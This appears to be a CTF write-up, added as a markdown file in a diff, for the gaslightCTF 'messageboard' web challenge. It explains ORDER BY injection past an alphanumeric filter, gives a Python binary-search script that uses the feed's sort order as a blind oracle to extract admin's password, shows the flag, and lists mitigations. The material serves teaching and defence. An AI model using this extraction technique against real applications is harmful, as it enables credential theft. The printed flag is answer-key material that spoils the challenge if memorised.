@@ -1,0 +1,203 @@
+---
+title: "gaslightCTF: messageboard"
+description: "A Bun + Postgres stories app whitelists every input to alphanumerics — which kills classic SQLi, but is exactly enough to name columns in an ORDER BY. We turn the sort order into a blind boolean oracle, binary-search admin's password character by character, then walk in through the front door."
+date: 2026-08-14T00:00:00.000Z
+---
+
+**Platform:** gaslightCTF
+**Challenge:** messageboard
+**Category:** Web
+**Difficulty:** Medium
+**Tags:** `sqli` `order-by-injection` `blind` `boolean-oracle` `postgres` `bun`
+
+**Solved by 0xAdham.**
+
+messageboard is gaslightCTF's social stories app — post a short public update, share something with your close friends, scroll the feed. The dev hardened the query layer properly: every user-supplied value is run through an alphanumeric-only `filter()` before it touches SQL, and `sql.unsafe` is the only query helper in the codebase. No parameters, no ORM — just "trust the whitelist." The flag sits in `admin.close_friends`, behind a list you're not on. The gaslight is the whitelist itself: they forgot that alphanumerics are *exactly enough* to name a column.
+
+## TL;DR
+
+This challenge chains two steps:
+
+1. **ORDER BY injection** → turn the public feed's sort order into a blind boolean oracle on `secret`
+2. **Binary-search the oracle** → recover admin's 16-hex-char password, log in as admin, read `close_friends`
+
+## Chapter 1: Reading the Source
+
+### The Stack
+
+Stack (from the handout): `Bun.serve()` routes + Postgres via `Bun.sql`. The query helper is a single export:
+
+```js
+export const query = sql.unsafe;
+```
+
+Raw string execution, no parameters, every query is a template literal. That's the attack surface.
+
+### The Schema
+
+```sql
+CREATE TABLE users (
+  name TEXT PRIMARY KEY,
+  secret TEXT NOT NULL,
+  public TEXT, public_expiry TIMESTAMPTZ,
+  close_friends TEXT, close_friends_expiry TIMESTAMPTZ,
+  close_friends_list TEXT[] NOT NULL DEFAULT '{}'
+);
+```
+
+Seed notes: **`admin.close_friends = FLAG`**, `admin.close_friends_list = ['alice','carol','dave']`, and `admin` has a public story. That last part matters.
+
+### The Feed Endpoint
+
+`GET /api/stories` has two query branches — one for the public feed, one for close friends:
+
+```js
+const column = url.searchParams.get("column") || "name";
+const order  = url.searchParams.get("order")  || "ASC";
+if (!filter(column) || !filter(order)) return 400;
+
+// public feed — admin IS here (has a public story)
+`... FROM users WHERE public IS NOT NULL AND public_expiry > now()
+ ORDER BY ${column} ${order}`
+
+// close-friends feed — only rows where YOU are in the author's list
+`... close_friends AS story ...
+ WHERE close_friends IS NOT NULL AND close_friends_expiry > now()
+   AND (close_friends_list @> ARRAY['${name}'] OR name = '${name}')
+ ORDER BY ${column} ${order}`
+```
+
+`column` and `order` both come from query params, both pass through `filter()`, and both land directly in the `ORDER BY` clause — no quotes, no parameterization. That's our injection point.
+
+### The "Sanitizer"
+
+```js
+const whitelist = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
+export function filter(str) {
+  for (const c of [...str]) if (!whitelist.includes(c)) return false;
+  return true;
+}
+```
+
+Pure `[A-Za-z0-9]`. Applied to **every** input that reaches SQL — `name`, `password`, `friends[]`, `column`, `order`. No quote ever gets through, so classic string SQLi is dead everywhere a value sits inside `'...'`. The session `name` only ever comes from a filtered signup or a DB-stored name, so that's clean too.
+
+The gaslight: the devs thought "no quote = no SQLi." They were right about string contexts. They forgot about identifier contexts.
+
+## Chapter 2: The Bug — Alphanumeric Is Enough in ORDER BY
+
+`column` and `order` don't live inside quote marks — they're in an **identifier/expression context**. In SQL, column names are alphanumeric. `[A-Za-z0-9]` is exactly the charset you need to name a real column.
+
+Confirm injection:
+
+```
+column=name         -> 200  ✓ valid column
+column=boguscol     -> 500  ✗ unknown column → error bubbles up = raw injection confirmed
+column=secret       -> 200  ✓ sorts the feed by users.secret
+column=close_friends -> 400 ✗ blocked: '_' isn't in the whitelist
+```
+
+The `500` on `boguscol` is the proof. The SQL error means our value hit the parser — not a sanitizer. We have injection.
+
+### What We Can (and Can't) Do
+
+The whitelist shapes the exploit pretty tightly:
+
+| Blocked char | Rules out |
+|---|---|
+| `_` | Can't name `close_friends`, `close_friends_list`, `close_friends_expiry` |
+| spaces, `(`, `)`, `,`, quotes | No subqueries, no `CASE`, no `UNION`, no stacked queries |
+
+The only underscore-free columns in `users` are **`name`**, **`secret`**, and **`public`**.
+
+The flag column (`close_friends`) is only reachable by its alias `story` or positional `3` in the close-friends branch — but admin never appears in that result set for a non-friend. Dead end for a direct read.
+
+So the injection can't print the flag. But it can do something else: `ORDER BY secret` reorders the **public** feed (which *does* include admin, because admin has a public story) by each row's `secret` value. The JSON response order equals the sort order equals a **boolean comparison oracle** on secrets.
+
+## Chapter 3: Blind-Extracting admin's Secret
+
+`admin.secret` is generated as `crypto.getRandomValues(8 bytes).toHex()` — 16 lowercase hex characters.
+
+### The Oracle
+
+Register **pivot accounts** with a `secret` (password) I choose, give each one a public story so it appears in the feed, then ask:
+
+> In `ORDER BY secret ASC`, does admin sort *after* my pivot?
+
+For a known prefix `P` and candidate digit `d`, a pivot with `secret = P + d` satisfies (lexicographic order): `admin.secret > P+d  ⟺  admin.secret[i] >= d`.
+
+So: **admin sorts after the pivot ⟺ the next unknown character ≥ d** — a clean binary search.
+
+### The Script
+
+```python
+def admin_after(pivot_secret):           # is admin.secret > pivot_secret?
+    name = make_pivot(pivot_secret)       # signup(pw=pivot_secret) + post a public story
+    order = order_by("secret", "ASC")    # GET /api/stories?column=secret&order=ASC
+    return order.index("admin") > order.index(name)
+
+HEX = "0123456789abcdef"
+secret = ""
+for _ in range(16):
+    lo, hi = 0, 15
+    while lo < hi:
+        mid = (lo + hi + 1) // 2
+        lo, hi = (mid, hi) if admin_after(secret + HEX[mid]) else (lo, mid - 1)
+    secret += HEX[lo]
+```
+
+4 comparisons per character × 16 characters = ~64 pivot registrations. Each one posts a public story and fires a single sort query. The feed position does the rest.
+
+Result:
+
+```
+admin.secret = 4e82b211910f98e6
+```
+
+## Chapter 4: Reading the Flag
+
+With the secret in hand, log in as admin:
+
+```
+POST /api/login  {"name":"admin","password":"4e82b211910f98e6"}  -> 200
+```
+
+The close-friends query has an `OR name = '${session}'` branch, so admin sees admin's own close-friends story without needing to be on anyone's list:
+
+```
+GET /api/stories
+  -> {"author":"admin","visibility":"close_friends",
+      "story":"gaslightCTF{ar3_y0u_my_cl0s3_fr13nd_n0w?_4a7e0f6b6500}"}
+```
+
+## Flag
+
+```
+gaslightCTF{ar3_y0u_my_cl0s3_fr13nd_n0w?_4a7e0f6b6500}
+```
+
+## Mitigations
+
+**Allowlist column and order against a fixed set**
+
+The root cause is treating `column` and `order` as free-form alphanumeric input rather than as a finite enumeration of known-safe values. The fix:
+
+```js
+const ALLOWED_COLUMNS = new Set(["name", "public"]);
+const ALLOWED_ORDERS  = new Set(["ASC", "DESC"]);
+
+if (!ALLOWED_COLUMNS.has(column) || !ALLOWED_ORDERS.has(order)) return 400;
+```
+
+This collapses the attack surface to zero — there's no valid column left that can leak anything sensitive, and no way to inject an arbitrary identifier.
+
+**Parameterize everything else**
+
+`sql.unsafe` with string interpolation is dangerous by default. Use parameterized queries for every value, and reserve identifiers (column names, table names) for the allowlist approach above — those can't be parameterized at the driver level anyway, so allowlisting is the correct control.
+
+**Don't expose sort order as a side channel**
+
+Even with the injection closed, sorting a feed by a private column (`secret`) and reflecting the result order is a side-channel leak. If `secret` is a password, it has no business being a sortable column on a public endpoint. The public feed should expose only columns safe to order by — `name` and `public` here, not `secret`.
+
+---
+
+*0xAdham*
